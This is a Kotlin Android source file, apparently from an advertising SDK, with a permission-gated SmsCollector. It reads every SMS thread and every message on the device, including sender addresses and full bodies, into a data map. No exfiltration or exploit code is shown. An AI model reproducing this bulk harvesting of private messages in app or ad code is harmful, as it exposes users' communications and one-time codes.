package com.seamlabs.admore.data.source.local.collector

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.Telephony
import androidx.core.content.ContextCompat
import com.seamlabs.admore.data.source.local.model.SmsKeys
import com.seamlabs.admore.domain.model.Permission
import javax.inject.Inject

/**
 * Collector for SMS data.
 */
class SmsCollector @Inject constructor(
    context: Context
) : PermissionRequiredCollector(
    context,
    setOf(Permission.READ_SMS)
) {

    override fun isPermissionGranted(): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED
    }

    @SuppressLint("MissingPermission")
    override suspend fun collect(): Map<String, Any> {
        if (!isPermissionGranted()) {
            return emptyMap()
        }

        val data = mutableMapOf<String, Any>()
        
        // Get SMS threads
        val threads = getSmsThreads()
        data[SmsKeys.THREADS.toKey()] = threads
        
        // Get all messages
        val messages = getSmsMessages()
        data[SmsKeys.MESSAGES.toKey()] = messages

        return data
    }

    private fun getSmsThreads(): List<Map<String, Any>> {
        val threads = mutableListOf<Map<String, Any>>()
        
        context.contentResolver.query(
            Telephony.Sms.Conversations.CONTENT_URI,
            null,
            null,
            null,
            null
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                threads.add(getThreadInfo(cursor))
            }
        }

        return threads
    }

    private fun getThreadInfo(cursor: Cursor): Map<String, Any> {
        return mapOf(
            SmsKeys.THREAD_ID.toKey() to cursor.getLong(
                cursor.getColumnIndex(Telephony.Sms.Conversations.THREAD_ID)
            ),
            SmsKeys.THREAD_CONTACT.toKey() to (cursor.getString(
                cursor.getColumnIndex(Telephony.Sms.Conversations.ADDRESS)
            ) ?: "Unknown"),
            SmsKeys.THREAD_MESSAGE_COUNT.toKey() to cursor.getInt(
                cursor.getColumnIndex(Telephony.Sms.Conversations.MESSAGE_COUNT)
            ),
            SmsKeys.THREAD_SNIPPET.toKey() to (cursor.getString(
                cursor.getColumnIndex(Telephony.Sms.Conversations.SNIPPET)
            ) ?: ""),
            SmsKeys.THREAD_DATE.toKey() to cursor.getLong(
                cursor.getColumnIndex(Telephony.Sms.Conversations.DATE)
            )
        )
    }

    private fun getSmsMessages(): List<Map<String, Any>> {
        val messages = mutableListOf<Map<String, Any>>()
        
        context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            null,
            null,
            null,
            "${Telephony.Sms.DATE} DESC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                messages.add(getMessageInfo(cursor))
            }
        }

        return messages
    }

    private fun getMessageInfo(cursor: Cursor): Map<String, Any> {
        return mapOf(
            SmsKeys.MESSAGE_ID.toKey() to cursor.getLong(
                cursor.getColumnIndex(Telephony.Sms._ID)
            ),
            SmsKeys.MESSAGE_ADDRESS.toKey() to (cursor.getString(
                cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            ) ?: "Unknown"),
            SmsKeys.MESSAGE_BODY.toKey() to (cursor.getString(
                cursor.getColumnIndex(Telephony.Sms.BODY)
            ) ?: ""),
            SmsKeys.MESSAGE_DATE.toKey() to cursor.getLong(
                cursor.getColumnIndex(Telephony.Sms.DATE)
            ),
            SmsKeys.MESSAGE_TYPE.toKey() to cursor.getInt(
                cursor.getColumnIndex(Telephony.Sms.TYPE)
            ),
            SmsKeys.MESSAGE_READ.toKey() to (cursor.getInt(
                cursor.getColumnIndex(Telephony.Sms.READ)
            ) == 1),
            SmsKeys.MESSAGE_SEEN.toKey() to (cursor.getInt(
                cursor.getColumnIndex(Telephony.Sms.SEEN)
            ) == 1),
            SmsKeys.MESSAGE_SUBJECT.toKey() to (cursor.getString(
                cursor.getColumnIndex(Telephony.Sms.SUBJECT)
            ) ?: ""),
            SmsKeys.MESSAGE_SERVICE_CENTER.toKey() to (cursor.getString(
                cursor.getColumnIndex(Telephony.Sms.SERVICE_CENTER)
            ) ?: ""),
            SmsKeys.MESSAGE_STATUS.toKey() to cursor.getInt(
                cursor.getColumnIndex(Telephony.Sms.STATUS)
            ),
            SmsKeys.MESSAGE_THREAD_ID.toKey() to cursor.getLong(
                cursor.getColumnIndex(Telephony.Sms.THREAD_ID)
            )
        )
    }
} 